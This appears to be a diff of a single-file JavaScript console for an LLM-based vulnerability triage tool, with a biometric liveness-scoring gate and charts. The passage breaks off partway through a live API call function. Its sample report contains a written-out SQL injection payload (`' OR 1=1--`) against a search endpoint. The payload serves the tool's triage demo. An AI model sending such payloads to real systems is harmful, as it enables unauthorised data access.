+  <div class="panel" id="pRecords"><div class="ph"><h2>VulnTriage records · AURA data per run</h2><span class="ts" id="recTs">backend /api/records</span><span class="r"><button class="sbtn" id="recRefresh">⟳ refresh</button></span></div><div style="overflow-x:auto"><table class="dense" id="recTbl"><tr><td style="color:var(--dim)">No records yet (backend offline or no runs)</td></tr></table></div></div>
+</div></section>
+
+<section class="view" id="v-visibility"><div class="stack"><div id="visSlot" class="stack"></div><div class="panel"><div class="ph"><h2>AURA constants</h2><span class="ts">read-only · src/aura.py</span></div><table id="visTbl"></table></div></div></section>
+<section class="view panel" id="v-findings"><div class="ph"><h2>Findings</h2><span class="ts">this session · click a row</span><span class="r"><button class="sbtn" id="fxJson">Export JSON</button> <button class="sbtn" id="fxCsv">Export CSV</button></span></div><div style="overflow-x:auto"><table class="dense" id="findTbl"></table></div></section>
+<section class="view panel" id="v-settings"><div class="ph"><h2>Settings</h2><span class="ts">mirrors src/agent.py</span></div>
+<div class="sgrid">
+<label>Mode</label><div class="toggle" style="width:max-content"><button id="sDemo">DEMO</button><button id="sLive">LIVE</button></div>
+<label for="sKey">Nebius API key</label><input class="inp" id="sKey" type="password" autocomplete="off" placeholder="v1.… held in memory only, never stored">
+<label for="sTier">Default tier</label><select class="inp" id="sTier"><option>nano</option><option>super</option><option selected>ultra</option></select>
+<label>Persist runs locally</label><label class="chk"><input type="checkbox" id="sPersist" checked> keep session runs in this browser (never the key)</label>
+<label>Session</label><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="sbtn" id="sExpJ">Export JSON</button><button class="sbtn" id="sExpC">Export CSV</button><button class="sbtn" id="sReset" style="border-color:rgba(255,74,90,.5);color:#ff8a95">Reset session</button></div>
+</div><table id="setTbl"></table><div class="hint">API keys are held in memory only and never written to storage. Live calls may be blocked by browser CORS; use <code>python src/agent.py</code> for production runs.</div></section>
+</div>
+<aside class="stack">
+  <div class="panel"><div class="ph"><h2>Session</h2></div>
+    <div class="stats"><div><b id="sRuns">0</b><small>Runs</small></div><div><b id="sAvg">—</b><small>Avg CVSS</small></div><div class="red"><b id="sCrit">0</b><small>Critical</small></div></div>
+    <canvas class="spark" id="spark" style="width:100%"></canvas>
+    <ul class="list" id="runList"></ul></div>
+  <div class="panel"><div class="ph"><h2>Policy checks</h2><span class="ts">_validate()</span></div>
+    <div class="stats"><div><b id="pPass">0</b><small>Schema valid</small></div><div class="red"><b id="pFail">0</b><small>Blocked</small></div></div>
+    <ul class="list" id="policyList"></ul></div>
+  <div class="panel"><div class="ph"><h2>Model tier usage</h2><span class="ts">Nebius Token Factory</span></div><ul class="bars" id="tierBars"></ul></div>
+</aside>
+</div>
+<footer>VulnTriage console prototype · single file · mirrors <code>src/agent.py</code> and <code>src/aura.py</code> · demo values are labelled.</footer>
+<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-labelledby="drTitle" aria-hidden="true"><div class="dh"><h2 id="drTitle">Run detail</h2><button class="sbtn" id="drCopy">Copy JSON</button><button class="sbtn" id="drDl">Download .json</button><button class="sbtn" id="drClose" aria-label="Close">✕</button></div><div id="drMeta" class="hint" style="margin:0 0 8px"></div><pre id="drJson"></pre></aside>
+<div class="toasts" id="toasts" aria-live="polite"></div><div class="tip" id="tip" role="tooltip"></div>
+<script>
+"use strict";
+// ---------- Constants mirrored from src/agent.py ----------
+const NEBIUS_BASE_URL = "https://api.tokenfactory.nebius.com/v1";
+const MODEL_ROUTING = {
+  nano:  "nvidia/llama-3.1-nemotron-nano-8b-v1",
+  super: "nvidia/llama-3.1-nemotron-70b-instruct",
+  ultra: "nvidia/llama-3.1-nemotron-ultra-253b-v1",
+};
+const TIER_SIZE = {nano:"8B", super:"70B", ultra:"253B"};
+const SYSTEM_PROMPT =
+  "You are a senior application security engineer. Given a vulnerability " +
+  "report, classify severity using CVSS, map it to the most relevant MITRE " +
+  "ATT&CK technique, and produce a remediation plan with concrete steps, " +
+  "affected assets, and estimated effort. Output strict JSON with keys " +
+  "severity, cvss_score, attack_technique, summary, remediation_steps, " +
+  "affected_assets, estimated_effort, and priority. No markdown, no preamble.";
+const USER_TEMPLATE = "Vulnerability report:\n{report}\n\nAnalyze and respond with the JSON schema above only.";
+const REQUIRED_KEYS = ["severity","cvss_score","attack_technique","summary","remediation_steps","affected_assets","estimated_effort","priority"];
+const SAMPLE = `Title: Unauthenticated SQL Injection in Search Endpoint
+Endpoint: GET /api/v2/search?q=
+Parameter: q (reflected in error page)
+Database: PostgreSQL 15
+Auth: None required
+PoC: /api/v2/search?q=' OR 1=1-- 
+Impact: Full read access to users, sessions, and payment_records tables.
+CVSS vector (submitter estimate): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`;
+
+// ---------- Exact port of src/aura.py ----------
+const REAL_GLINT_ARC_RATIO=0.5, PHOTO_GLINT_ARC_RATIO=1.0, GLINT_ACCEPT_LOW=0.35, GLINT_ACCEPT_HIGH=0.75;
+const MOUTH_MIN_PX=50, MOUTH_HIGH_ACC_PX=200, VISEME_CLIFF_PX=45, LIPSYNC_ACCEPT=0.80;
+const TARGET_FALSE_ACCEPT=1e-5;
+function glintScore(g){ if(g.arc_ratio<=0) return 0; const dev=Math.abs(g.arc_ratio-REAL_GLINT_ARC_RATIO), max=Math.abs(PHOTO_GLINT_ARC_RATIO-REAL_GLINT_ARC_RATIO); return Math.max(0,1-dev/max); }
+function glintPassed(g){ return GLINT_ACCEPT_LOW<=g.arc_ratio && g.arc_ratio<=GLINT_ACCEPT_HIGH; }
+function lipTier(l){ if(l.mouth_width_px>=MOUTH_HIGH_ACC_PX) return "99.9%"; if(l.mouth_width_px>=MOUTH_MIN_PX) return "85-90%"; if(l.mouth_width_px>=VISEME_CLIFF_PX) return "cliff"; return "below_cliff"; }
+function lipScore(l){ if(l.mouth_width_px<VISEME_CLIFF_PX) return 0; const wf=Math.min(1,(l.mouth_width_px-VISEME_CLIFF_PX)/(MOUTH_HIGH_ACC_PX-VISEME_CLIFF_PX)); return wf*l.viseme_match; }
+function lipPassed(l){ return l.mouth_width_px>=MOUTH_MIN_PX && l.viseme_match>=LIPSYNC_ACCEPT; }
+function logOdds(p){ p=Math.min(Math.max(p,1e-9),1-1e-9); return Math.log(p/(1-p)); }
+function fuse(g,l){
+  const gs=glintScore(g), ls=lipScore(l);
+  let wg,wl; if(g.distance_hint==="close"){wg=.65;wl=.35;}else{wg=.30;wl=.70;}
+  const gp=glintPassed(g), lp=lipPassed(l);
+  if(!gp&&lp){wg=.15;wl=.85;} else if(gp&&!lp){wg=.85;wl=.15;}
+  else if(!gp&&!lp){ return {fused:0,weights:{glint:wg,lipsync:wl},passed:false,reason:"Both biometric channels failed — submission rejected.",gs,ls}; }
+  const lo=wg*logOdds(gs)+wl*logOdds(ls), p=1/(1+Math.exp(-lo)), passed=p>=0.85;
+  return {fused:p,weights:{glint:wg,lipsync:wl},passed,gs,ls,
+    reason: passed?"Biometric gate passed — real human verified.":"Fused confidence below threshold — possible synthetic submission."};
+}
+function verifySubmission(a){
+  const g={arc_ratio:a.glint_arc_ratio,eye_width_px:a.eye_width_px,distance_hint:a.distance_hint};
+  const l={mouth_width_px:a.mouth_width_px,viseme_match:a.viseme_match};
+  const v=fuse(g,l), r4=x=>Math.round(x*1e4)/1e4;
+  return {aura_passed:v.passed,fused_score:r4(v.fused),glint_score:r4(glintScore(g)),glint_arc_ratio:g.arc_ratio,
+    lipsync_score:r4(lipScore(l)),lipsync_tier:lipTier(l),channel_weights:v.weights,
+    false_accept_rate:"1 in "+Math.round(1/TARGET_FALSE_ACCEPT).toLocaleString("en-US"),reason:v.reason};
+}
+
+// ---------- Port of agent._validate ----------
+function validate(r){
+  const missing=REQUIRED_KEYS.filter(k=>!(k in r));
+  if(missing.length) throw new Error("schema missing keys: "+missing.join(", "));
+  if(!["critical","high","medium","low","informational"].includes(r.severity)) throw new Error("invalid severity: "+r.severity);
+  const c=parseFloat(r.cvss_score); if(!(c>=0&&c<=10)) throw new Error("cvss_score out of range: "+r.cvss_score);
+  if(!Array.isArray(r.remediation_steps)||!r.remediation_steps.length) throw new Error("remediation_steps must be a non-empty list");
+  if(!["S","M","L"].includes(r.estimated_effort)) throw new Error("invalid effort: "+r.estimated_effort);
+  const p=parseInt(r.priority,10); if(!(p>=1&&p<=5)) throw new Error("priority out of bounds: "+r.priority);
+  return r;
+}
+
+// ---------- State ----------
+const $=id=>document.getElementById(id);
+const REDUCE=matchMedia("(prefers-reduced-motion: reduce)").matches;
+const state={tier:"ultra",dist:"close",live:false,runs:[],blocked:0,phase:"idle",failedAt:null,activeOut:false,t0:0};
+const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const SEV={critical:"#ff4a5a",high:"#ff8a1f",medium:"#f5c542",low:"#2fd4c8",informational:"#7d8aa5"};
+const TIERC={nano:"#2fd4c8",super:"#3b8cff",ultra:"#8b6cff"};
+function hidpi(cv){const r=cv.getBoundingClientRect(),d=Math.min(2,devicePixelRatio||1);cv.width=Math.max(1,r.width*d);cv.height=Math.max(1,r.height*d);const c=cv.getContext("2d");c.setTransform(d,0,0,d,0,0);return{c,w:r.width,h:r.height};}
+
+// ---------- Inputs ----------
+$("report").value=SAMPLE;
+const updCount=()=>$("charcount").textContent=$("report").value.length+" chars · USER_TEMPLATE.format(report=…)";
+$("report").addEventListener("input",updCount);updCount();
+
+for(const t of ["nano","super","ultra"]){
+  const b=document.createElement("button");b.className="tier"+(t===state.tier?" on":"");b.dataset.t=t;b.setAttribute("aria-pressed",t===state.tier);
+  b.innerHTML=`<div class="t">${t}</div><div class="s">${TIER_SIZE[t]}${t==="ultra"?" · default":""}</div><code>${MODEL_ROUTING[t]}</code>`;
+  b.onclick=()=>{state.tier=t;document.querySelectorAll(".tier").forEach(x=>{x.classList.toggle("on",x.dataset.t===t);x.setAttribute("aria-pressed",x.dataset.t===t);});typeof renderKpis==="function"&&renderKpis();};
+  $("tiers").appendChild(b);
+}
+function setMode(live){state.live=live;$("mLive").classList.toggle("on",live);$("mDemo").classList.toggle("on",!live);$("apikey").classList.toggle("show",live);
+  $("statusPill").classList.toggle("live",live);$("statusTxt").textContent=live?"Live · Nebius":"Demo mode";}
+$("mDemo").onclick=()=>setMode(false);$("mLive").onclick=()=>setMode(true);$("statusPill").onclick=()=>setMode(!state.live);
+function setDist(d){state.dist=d;$("dClose").classList.toggle("on",d==="close");$("dRange").classList.toggle("on",d==="range");renderAura(true);}
+$("dClose").onclick=()=>setDist("close");$("dRange").onclick=()=>setDist("range");
+addEventListener("keydown",e=>{if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==="k"){e.preventDefault();$("gsearch").focus();}});
+
+
+// ---------- AURA ----------
+const hist=[]; // {fused,glint,lip}
+function readings(){return{glint_arc_ratio:+$("glint").value,eye_width_px:+$("eye").value,mouth_width_px:+$("mouth").value,viseme_match:+$("vis").value,distance_hint:state.dist};}
+let histTimer=null;
+function renderAura(record){
+  const a=readings();$("v-glint").textContent=a.glint_arc_ratio.toFixed(2);$("v-eye").textContent=a.eye_width_px;$("v-mouth").textContent=a.mouth_width_px;$("v-vis").textContent=a.viseme_match.toFixed(2);
+  const skip=$("skipGate").checked;$("auraFields").style.opacity=skip?.4:1;
+  const v=verifySubmission(a);$("verdict").className="verdict "+(skip?"skip":v.aura_passed?"pass":"fail");
+  $("fg").style.strokeDashoffset=207.3*(1-v.fused_score);$("fg").style.stroke=v.aura_passed?"#2fd4c8":"#ff4a5a";
+  $("fusedTxt").textContent=v.fused_score.toFixed(3);$("k-g").textContent=v.glint_score.toFixed(4);$("k-l").textContent=v.lipsync_score.toFixed(4);
+  $("k-t").textContent=v.lipsync_tier;$("k-w").textContent=v.channel_weights.glint.toFixed(2)+" / "+v.channel_weights.lipsync.toFixed(2);
+  const p=$("aPill");
+  if(skip){p.className="pill mu";p.textContent="Gate skipped";$("aReason").textContent="No readings passed — gate does not run (agent.py with aura=None).";}
+  else{p.className="pill "+(v.aura_passed?"ok":"no");p.textContent=v.aura_passed?"✓ Live human":"✕ Rejected";$("aReason").textContent=v.reason+" · FAR "+v.false_accept_rate;}
+  if(record){clearTimeout(histTimer);histTimer=setTimeout(()=>pushHist(v),120);}
+  return skip?null:v;
+}
+function pushHist(v){hist.push({fused:v.fused_score,glint:v.glint_score,lip:v.lipsync_score,pass:v.aura_passed});if(hist.length>40)hist.shift();
+  $("fireTs").textContent=hist.length+" samples · live from sliders";renderLegend(v);}
+function renderLegend(v){const L=[["#ffb347","fused  "+v.fused_score.toFixed(3)],["#ff7a18","glint  "+v.glint_score.toFixed(3)],["#2fd4c8","lipsync "+v.lipsync_score.toFixed(3)],
+  ["#c05cff","weights "+v.channel_weights.glint+" / "+v.channel_weights.lipsync],["#3b8cff","tier "+v.lipsync_tier],[v.aura_passed?"#2bd67b":"#ff4a5a",v.aura_passed?"gate PASS ≥ 0.85":"gate FAIL < 0.85"],["#7d8aa5","FAR "+v.false_accept_rate]];
+  $("fireLeg").innerHTML=L.map(([c,t])=>`<li style="color:${c}">${esc(t)}</li>`).join("");}
+["glint","eye","mouth","vis","skipGate"].forEach(id=>$(id).addEventListener("input",()=>renderAura(true)));
+pushHist(renderAura(false)||verifySubmission(readings()));
+
+// ---------- Flow (Sankey-style) ----------
+const FN=[ // id,label,col,row-of-n,icon
+ ["rep","Report",0,0,1,"▤"],["glint","Glint channel",1,0,2,"◉"],["lip","Lip-sync channel",1,1,2,"◡"],
+ ["nano","nano · 8B",2,0,3,"N"],["super","super · 70B",2,1,3,"S"],["ultra","ultra · 253B",2,2,3,"U"],
+ ["val","_validate()",3,0,1,"✓"],["cvss","CVSS",4,0,4,"◔"],["attck","ATT&CK",4,1,4,"⌖"],["rem","Remediation",4,2,4,"☰"],["pri","Priority",4,3,4,"↑"]];
+const HDR=["Input","AURA gate","Model tier","Validate","Output"];
+const LINKS=[];
+["glint","lip"].forEach(g=>LINKS.push(["rep",g]));
+["glint","lip"].forEach(g=>["nano","super","ultra"].forEach(t=>LINKS.push([g,t])));
+["nano","super","ultra"].forEach(t=>LINKS.push([t,"val"]));
+["cvss","attck","rem","pri"].forEach(o=>LINKS.push(["val",o]));
+let flow={};
+function flowLayout(){const f=hidpi($("flow"));flow={...f,nodes:{}};const padX=70,padR=130,top=46,bot=26;
+  FN.forEach(([id,label,col,i,n,ic])=>{const x=padX+(f.w-padX-padR)*col/4;const span=f.h-top-bot;const y=top+span*(n===1?.5:(i+.5)/n);flow.nodes[id]={id,label,x,y,ic,col};});
+  const box=$("flowBox");box.querySelectorAll(".colhdr").forEach(e=>e.remove());
+  HDR.forEach((h,i)=>{const d=document.createElement("div");d.className="colhdr";d.textContent=h;const x=padX+(f.w-padX-padR)*i/4;d.style.left=Math.max(0,Math.min(f.w-90,x-40))+"px";
+    d.style.borderLeftColor=colColor(i/4);box.appendChild(d);});
+  // bundles of faint strands per link (deterministic)
+  let seed=7;const rnd=()=>(seed=(seed*16807)%2147483647)/2147483647;
+  flow.strands=LINKS.map(()=>Array.from({length:7},()=>[(rnd()-.5)*26,(rnd()-.5)*26]));}
+function colColor(t){const a=[[47,212,200],[56,225,255],[139,108,255],[192,92,255],[255,138,31]];const k=t*(a.length-1),i=Math.min(a.length-2,Math.floor(k)),f=k-i;
+  const c=a[i].map((v,j)=>Math.round(v+(a[i+1][j]-v)*f));return`rgb(${c})`;}
+function linkActive(a,b){const v=readings(),skip=$("skipGate").checked;const tier=state.tier;
+  if(["nano","super","ultra"].includes(b))return b===tier; if(["nano","super","ultra"].includes(a))return a===tier; return true;}
+function linkWidth(a,b){if(a==="rep"||["nano","super","ultra"].includes(b)){const v=verifySubmission(readings());const w=(a==="rep"?b:a)==="glint"?v.channel_weights.glint:v.channel_weights.lipsync;return 3+w*12;}return 6;}
+function phaseOf(a){return flow.nodes[a].col;} // link stage = source col
+function drawFlow(t){const{c,w,h,nodes}=flow;if(!c)return;c.clearRect(0,0,w,h);
+  const prog=state.phase==="run"?Math.min(4,(t-state.t0)/650):state.phase==="done"?4:state.phase==="fail"?state.failedAt:-1;
+  LINKS.forEach(([a,b],li)=>{const A=nodes[a],B=nodes[b];const act=linkActive(a,b);const stage=phaseOf(a);
+    const g=c.createLinearGradient(A.x,0,B.x,0);g.addColorStop(0,colColor(A.col/4));g.addColorStop(1,colColor(B.col/4));
+    const mx=(A.x+B.x)/2;const path=(dy0,dy1)=>{c.beginPath();c.moveTo(A.x,A.y+dy0);c.bezierCurveTo(mx,A.y+dy0,mx,B.y+dy1,B.x,B.y+dy1);};
+    c.globalCompositeOperation="lighter";
+    flow.strands[li].forEach(([d0,d1])=>{path(d0*.5,d1*.5);c.strokeStyle=g;c.globalAlpha=.06;c.lineWidth=1.2;c.stroke();});
+    const cut=state.phase==="fail"&&stage>=1;
+    const lit=act&&prog>=stage+ (state.phase==="run"?0:0) && prog>=0 && !cut;
+    const wd=linkWidth(a,b)*(act?1:.45);
+    path(0,0);c.lineCap="round";
+    if(cut){c.globalAlpha=act?.55:.12;c.strokeStyle="#ff4a5a";c.setLineDash([6,8]);c.lineWidth=act?3:1.5;c.stroke();c.setLineDash([]);}
+    else{c.globalAlpha=act?(lit?.85:.32):.10;c.strokeStyle=g;c.lineWidth=wd;c.shadowColor=colColor(B.col/4);c.shadowBlur=lit?18:act?6:0;c.stroke();c.shadowBlur=0;}
+    if(lit&&!REDUCE&&act){for(let k=0;k<3;k++){const u=((t/1600)+k/3+li*.13)%1;const x=bez(A.x,mx,mx,B.x,u),y=bez(A.y,A.y,B.y,B.y,u);
+      c.globalAlpha=.9;const rg=c.createRadialGradient(x,y,0,x,y,7);rg.addColorStop(0,"#fff");rg.addColorStop(1,"rgba(255,255,255,0)");c.fillStyle=rg;c.beginPath();c.arc(x,y,7,0,7);c.fill();}}
+    c.globalAlpha=1;c.globalCompositeOperation="source-over";});
+  // red cut marker
+  if(state.phase==="fail"){const G=nodes.glint,L=nodes.lip,x=(G.x+nodes.nano.x)/2;c.strokeStyle="#ff4a5a";c.lineWidth=2;c.shadowColor="#ff4a5a";c.shadowBlur=14;
+    c.beginPath();c.moveTo(x-8,G.y-30);c.lineTo(x+8,L.y+30);c.stroke();c.shadowBlur=0;c.fillStyle="#ff8a95";c.font="600 11px "+getComputedStyle(document.body).fontFamily;c.textAlign="center";c.fillText("AURA GATE FAILED — FLOW CUT",x,(G.y+L.y)/2+4);}
+  Object.values(nodes).forEach(n=>{const act=!["nano","super","ultra"].includes(n.id)||n.id===state.tier;const col=colColor(n.col/4);
+    const bad=state.phase==="fail"&&n.col>=2;
+    c.beginPath();c.arc(n.x,n.y,15,0,7);c.fillStyle="#0b1324";c.fill();c.lineWidth=act?2:1;c.strokeStyle=bad?"#5a2a33":act?col:"#2a3550";c.shadowColor=col;c.shadowBlur=act&&!bad?12:0;c.stroke();c.shadowBlur=0;
+    c.fillStyle=bad?"#7a4a55":act?"#e6ebf5":"#56627c";c.font="600 12px "+getComputedStyle(document.body).fontFamily;c.textAlign="center";c.textBaseline="middle";c.fillText(n.ic,n.x,n.y+1);
+    c.font=(act?"500 ":"400 ")+"11.5px "+getComputedStyle(document.body).fontFamily;c.fillStyle=bad?"#7a4a55":act?"#c9d3e6":"#56627c";
+    const right=n.col===4,left=n.col===0;c.textAlign=right?"left":left?"right":"center";c.fillText(n.label,right?n.x+22:left?n.x-22:n.x,right||left?n.y:n.y+28);
+    if(n.col===4&&state.last&&state.phase==="done"){c.fillStyle="#7d8aa5";c.font="500 10.5px "+getComputedStyle(document.body).fontFamily;const r=state.last;
+      const val={cvss:r.cvss_score+" · "+r.severity,attck:String(r.attack_technique).split(" ")[0],rem:(r.remediation_steps||[]).length+" steps",pri:"P"+r.priority+" · effort "+r.estimated_effort}[n.id];c.fillText(val,n.x+22,n.y+14);}
+  });}
+function bez(p0,p1,p2,p3,t){const u=1-t;return u*u*u*p0+3*u*u*t*p1+3*u*t*t*p2+t*t*t*p3;}
+
+// ---------- Fire chart ----------
+let fire={},P=[];
+function fireLayout(){fire=hidpi($("fire"));fire.pl=30;fire.pb=20;}
+function spawnFire(){const{w,h,pl,pb}=fire;if(!w||!hist.length)return;const n=hist.length,cw=(w-pl-6),ch=h-pb-6;
+  const per=REDUCE?0:Math.max(3,Math.round(70/n));
+  hist.forEach((s,i)=>{const seg=cw/n;
+    for(let k=0;k<per;k++){const x=pl+seg*(i+Math.random());const teal=Math.random()<.42;const v=teal?s.lip:Math.max(s.fused,s.glint*.9);
+      const H=Math.max(6,v*ch*(.55+.45*Math.abs(Math.sin(x*.045+performance.now()*.002))));P.push({x,y:h-pb,vx:(Math.random()-.5)*.35,vy:-(H/24)*(.7+Math.random()*.6),life:0,max:30+Math.random()*16,r:(teal?5:6.5)*(.6+Math.random()*.7),teal});}});
+  if(P.length>3200)P.splice(0,P.length-3200);}
+function drawFire(){const{c,w,h,pl,pb}=fire;if(!c)return;c.globalCompositeOperation="source-over";c.clearRect(0,0,w,h);
+  const ch=h-pb-6,f=getComputedStyle(document.body).fontFamily;
+  c.font="10.5px "+f;c.fillStyle="#56627c";c.strokeStyle="#131c30";c.lineWidth=1;c.textAlign="right";c.textBaseline="middle";
+  [0,.25,.5,.75,1].forEach(v=>{const y=h-pb-v*ch;c.beginPath();c.moveTo(pl,y);c.lineTo(w,y);c.stroke();c.fillText(v.toFixed(2),pl-5,y);});
+  const ty=h-pb-.85*ch;c.setLineDash([4,5]);c.strokeStyle="rgba(43,214,123,.5)";c.beginPath();c.moveTo(pl,ty);c.lineTo(w,ty);c.stroke();c.setLineDash([]);
+  c.fillStyle="rgba(43,214,123,.8)";c.textAlign="left";c.fillText("0.85 gate",pl+4,ty-8);
+  c.globalCompositeOperation="lighter";
+  for(let i=P.length-1;i>=0;i--){const p=P[i];p.life++;p.x+=p.vx+Math.sin((p.life+p.x)*.15)*.25;p.y+=p.vy;p.vy*=.985;
+    const k=p.life/p.max;if(k>=1){P.splice(i,1);continue;}const r=p.r*(1-k*.6);
+    const col=p.teal?(k<.25?[200,255,250]:k<.6?[47,212,200]:[30,90,170]):(k<.2?[255,240,170]:k<.5?[255,150,30]:[220,50,20]);
+    const a=(1-k)*.5;const g=c.createRadialGradient(p.x,p.y,0,p.x,p.y,r);g.addColorStop(0,`rgba(${col},${a})`);g.addColorStop(1,`rgba(${col},0)`);c.fillStyle=g;c.beginPath();c.arc(p.x,p.y,r,0,7);c.fill();}
+  c.globalCompositeOperation="source-over";
+  // fused line for precision
+  if(hist.length>1){const n=hist.length,cw=w-pl-6;c.strokeStyle="rgba(255,220,160,.75)";c.lineWidth=1.2;c.beginPath();hist.forEach((s,i)=>{const x=pl+cw*i/(n-1),y=h-pb-s.fused*ch;i?c.lineTo(x,y):c.moveTo(x,y);});c.stroke();}
+  c.fillStyle="#56627c";c.textAlign="center";c.textBaseline="alphabetic";c.font="10.5px "+f;
+  const n=hist.length,cw=w-pl-6;[0,.25,.5,.75,1].forEach(q=>{const i=Math.round(q*(n-1));if(n>0)c.fillText("#"+(i+1),pl+(n===1?cw/2:cw*q),h-4);});}
+function drawStaticFire(){P=[];for(let j=0;j<40;j++){spawnFire();P.forEach(p=>{p.life+=Math.random()*p.max*.8;p.x+=p.vx*p.life;p.y+=p.vy*p.life*.9;});}drawFire();}
+
+// ---------- Charts ----------
+function donut(svg,leg,data){const tot=data.reduce((s,d)=>s+d[1],0);let a=-Math.PI/2,html="";const R=50,r=30;
+  if(!tot){svg.innerHTML=`<circle cx="60" cy="60" r="40" fill="none" stroke="#16203a" stroke-width="20"/><text x="60" y="64" fill="#56627c" font-size="11" text-anchor="middle">no runs</text>`;leg.innerHTML="";return;}
+  data.filter(d=>d[1]).forEach(([l,v,c])=>{const b=a+v/tot*Math.PI*2-0.0001;const L=b-a>Math.PI?1:0;const p=(rr,t)=>[60+rr*Math.cos(t),60+rr*Math.sin(t)];
+    const[x1,y1]=p(R,a),[x2,y2]=p(R,b),[x3,y3]=p(r,b),[x4,y4]=p(r,a);
+    html+=`<path d="M${x1} ${y1}A${R} ${R} 0 ${L} 1 ${x2} ${y2}L${x3} ${y3}A${r} ${r} 0 ${L} 0 ${x4} ${y4}Z" fill="${c}" opacity=".9" stroke="#0a1020" stroke-width="1.5"/>`;a=b;});
+  svg.innerHTML=html+`<text x="60" y="58" fill="#e6ebf5" font-size="18" font-weight="600" text-anchor="middle">${tot}</text><text x="60" y="74" fill="#56627c" font-size="9" text-anchor="middle" letter-spacing="1">RUNS</text>`;
+  leg.innerHTML=data.map(([l,v,c])=>`<li><i style="background:${c}"></i>${l}<em>${v} · ${Math.round(v/tot*100)}%</em></li>`).join("");}
+function bars(el,items){const m=Math.max(1,...items.map(i=>i[1]));el.innerHTML=items.length?items.map(([l,v,s])=>`<li><span class="lb" title="${esc(l)}">${esc(l)}</span><span class="tr"><i style="width:${v/m*100}%"></i></span><em>${s??v}</em></li>`).join(""):'<li style="color:var(--dim)">No data</li>';}
+function spark(){const cv=$("spark"),{c,w,h}=hidpi(cv);c.clearRect(0,0,w,h);const v=state.runs.map(r=>r.cvss_score);if(!v.length){c.fillStyle="#56627c";c.font="11px sans-serif";c.fillText("CVSS history appears after a run",4,h/2);return;}
+  const pts=v.length===1?[v[0],v[0]]:v;const X=i=>4+(w-8)*i/(pts.length-1),Y=x=>h-6-(x/10)*(h-12);
+  const g=c.createLinearGradient(0,0,0,h);g.addColorStop(0,"rgba(255,74,90,.35)");g.addColorStop(1,"rgba(255,74,90,0)");
+  c.beginPath();pts.forEach((p,i)=>i?c.lineTo(X(i),Y(p)):c.moveTo(X(i),Y(p)));c.lineTo(X(pts.length-1),h);c.lineTo(X(0),h);c.fillStyle=g;c.fill();
+  c.beginPath();pts.forEach((p,i)=>i?c.lineTo(X(i),Y(p)):c.moveTo(X(i),Y(p)));c.strokeStyle="#ff4a5a";c.lineWidth=1.6;c.shadowColor="#ff4a5a";c.shadowBlur=8;c.stroke();c.shadowBlur=0;}
+function renderSession(){const R=state.runs;$("sRuns").textContent=R.length;$("bell").textContent=R.filter(r=>r.severity==="critical").length+state.blocked;
+  $("sCrit").textContent=R.filter(r=>r.severity==="critical").length;$("sAvg").textContent=R.length?(R.reduce((s,r)=>s+r.cvss_score,0)/R.length).toFixed(1):"—";
+  $("runList").innerHTML=R.slice(-4).reverse().map(r=>`<li><span>${esc(String(r.attack_technique).split(" ")[0])} · ${r.tier}${r.demo?'<span class="tag">demo</span>':""}</span><span class="${r.severity==="critical"?"bad":""}">${r.cvss_score}</span></li>`).join("")||'<li><span style="color:var(--dim)">No runs yet</span><span></span></li>';
+  $("pPass").textContent=R.filter(r=>r.valid).length;$("pFail").textContent=state.blocked+R.filter(r=>!r.valid).length;
+  const last=R[R.length-1];
+  $("policyList").innerHTML=[["AURA liveness gate",state.lastGate===false?"fail":state.lastGate===null?"skipped":"pass"],["Required keys (8)",last?(last.valid?"pass":"fail"):"—"],["Severity enum",last?"pass":"—"],["CVSS 0–10",last?"pass":"—"],["Effort S/M/L · priority 1–5",last?(last.valid?"pass":"fail"):"—"]]
+    .map(([l,s])=>`<li><span>${l}</span><span class="${s==="pass"?"good":s==="fail"?"bad":""}">${s}</span></li>`).join("");
+  const tc=t=>R.filter(r=>r.tier===t).length;
+  bars($("tierBars"),["nano","super","ultra"].map(t=>[MODEL_ROUTING[t].replace("nvidia/llama-3.1-",""),tc(t)]));
+  donut($("dSev"),$("lSev"),["critical","high","medium","low","informational"].map(s=>[s,R.filter(r=>r.severity===s).length,SEV[s]]));
+  donut($("dTier"),$("lTier"),["nano","super","ultra"].map(t=>[t,tc(t),TIERC[t]]));
+  bars($("assetBars"),last?(last.affected_assets||[]).map((a,i)=>[a,(last.affected_assets.length-i),"#"+(i+1)]):[]);
+  spark();renderTables();}
+function renderTables(){const R=state.runs;
+  $("findTbl").innerHTML="<tr><th>#</th><th>Severity</th><th>CVSS</th><th>Technique</th><th>Tier</th><th>Source</th></tr>"+(R.map((r,i)=>`<tr><td>${i+1}</td><td style="color:${SEV[r.severity]}">${r.severity}</td><td>${r.cvss_score}</td><td><code>${esc(r.attack_technique)}</code></td><td>${r.tier}</td><td>${r.demo?"demo":"live"}</td></tr>`).join("")||'<tr><td colspan="6" style="color:var(--dim)">No findings yet — run a triage.</td></tr>');
+  $("setTbl").innerHTML="<tr><th>Setting</th><th>Value</th></tr>"+[["Base URL",NEBIUS_BASE_URL],...Object.entries(MODEL_ROUTING).map(([k,v])=>["Tier "+k,v]),["Fallback tier","ultra"],["Temperature","0.0"],["Required keys",REQUIRED_KEYS.join(", ")]].map(([a,b])=>`<tr><td>${a}</td><td><code>${esc(b)}</code></td></tr>`).join("");
+  $("visTbl").innerHTML="<tr><th>Constant</th><th>Value</th></tr>"+[["REAL_GLINT_ARC_RATIO",REAL_GLINT_ARC_RATIO],["PHOTO_GLINT_ARC_RATIO",PHOTO_GLINT_ARC_RATIO],["GLINT_ACCEPT",GLINT_ACCEPT_LOW+" – "+GLINT_ACCEPT_HIGH],["MOUTH_MIN_PX / HIGH_ACC / CLIFF",MOUTH_MIN_PX+" / "+MOUTH_HIGH_ACC_PX+" / "+VISEME_CLIFF_PX],["LIPSYNC_ACCEPT",LIPSYNC_ACCEPT],["Weights close / range","0.65·0.35 / 0.30·0.70"],["Single-channel reweight","0.85 / 0.15"],["Fused threshold","0.85"],["TARGET_FALSE_ACCEPT","1e-5"]].map(([a,b])=>`<tr><td>${a}</td><td><code>${b}</code></td></tr>`).join("");}
+
+// ---------- Demo / live ----------
+// ---------- Live call ----------
+async function liveCall(report,model){
+  const key=$("apikey").value.trim();
